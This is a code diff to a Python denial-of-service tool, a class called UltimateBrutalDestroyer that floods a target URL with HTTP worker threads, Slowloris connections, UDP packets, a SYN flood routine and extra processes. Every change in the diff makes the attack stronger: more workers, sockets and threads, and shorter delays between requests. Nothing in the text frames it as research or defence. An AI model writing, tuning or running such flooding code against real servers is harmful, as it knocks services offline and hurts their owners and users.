@@ -46,9 +46,9 @@ class UltimateBrutalDestroyer:
         
         # System resources - Reduced to half for Windows stability
         self.cpu_count = multiprocessing.cpu_count()
-        self.max_workers = self.cpu_count * 50  # Reduced from 250 to 50 workers per CPU core
-        self.max_sockets = 1000  # Reduced from 5000 to 1000
-        self.max_async_tasks = 500  # Reduced from 2500 to 500
+        self.max_workers = self.cpu_count * 100  # Increased from 50 to 100 workers per CPU core
+        self.max_sockets = 2000  # Increased from 1000 to 2000
+        self.max_async_tasks = 1000  # Increased from 500 to 1000
         
         # Parse URL
         self.parsed_url = urlparse(target_url)
@@ -149,7 +149,7 @@ class UltimateBrutalDestroyer:
                     self.failed_requests += 1
             
             # Minimal delay for maximum speed
-            time.sleep(random.uniform(0.0001, 0.001))
+            time.sleep(random.uniform(0.00005, 0.0005))  # Reduced from 0.0001-0.001 to 0.00005-0.0005
 
     def slowloris_destroyer(self):
         """Advanced Slowloris attack"""
@@ -288,7 +288,7 @@ class UltimateBrutalDestroyer:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 
                 # Send random UDP packets
-                for _ in range(100):
+                for _ in range(200):  # Increased from 100 to 200
                     if not self.running:
                         break
                     
@@ -309,7 +309,7 @@ class UltimateBrutalDestroyer:
         """SYN flood attack simulation"""
         while self.running:
             try:
-                for _ in range(50):
+                for _ in range(100):  # Increased from 50 to 100
                     if not self.running:
                         break
                     
@@ -349,7 +349,7 @@ class UltimateBrutalDestroyer:
             except Exception:
                 local_failed += 1
             
-            time.sleep(0.0001)
+            time.sleep(0.00005)  # Reduced from 0.0001 to 0.00005
         
         return local_success, local_failed
 
@@ -373,8 +373,8 @@ class UltimateBrutalDestroyer:
         # 1. Multi-threaded HTTP attacks
         print("🚀 Starting HTTP thread army...")
         thread_batch_size = 200  # Increased from 100 to 200
-        for batch in range(0, min(self.max_workers, 500), thread_batch_size):  # Reduced from 1000 to 500
-            batch_end = min(batch + thread_batch_size, min(self.max_workers, 500))
+        for batch in range(0, min(self.max_workers, 1000), thread_batch_size):  # Increased from 500 to 1000
+            batch_end = min(batch + thread_batch_size, min(self.max_workers, 1000))
             for i in range(batch, batch_end):
                 thread = threading.Thread(target=self.brutal_http_worker, args=(i,), daemon=True)
                 thread.start()
@@ -427,23 +427,23 @@ class UltimateBrutalDestroyer:
         
         # 4. UDP flood
         print("💥 Starting UDP flood...")
-        for i in range(self.cpu_count):
+        for i in range(self.cpu_count * 2):  # Increased from cpu_count to cpu_count * 2
             udp_thread = threading.Thread(target=self.udp_flood_attack, daemon=True)
             udp_thread.start()
             threads.append(udp_thread)
         
         # 5. SYN flood simulation
         print("🔥 Starting SYN flood simulation...")
-        for i in range(self.cpu_count * 2):
+        for i in range(self.cpu_count * 4):  # Increased from cpu_count * 2 to cpu_count * 4
             syn_thread = threading.Thread(target=self.syn_flood_attack, daemon=True)
             syn_thread.start()
             threads.append(syn_thread)
         
         # 6. Multi-process attack
         print("🚀 Starting process army...")
-        process_pool = ProcessPoolExecutor(max_workers=self.cpu_count)
+        process_pool = ProcessPoolExecutor(max_workers=self.cpu_count * 2)  # Increased from cpu_count to cpu_count * 2
         process_futures = []
-        for i in range(self.cpu_count):
+        for i in range(self.cpu_count * 2):  # Increased from cpu_count to cpu_count * 2
             future = process_pool.submit(self.process_worker, i)
             process_futures.append(future)
         
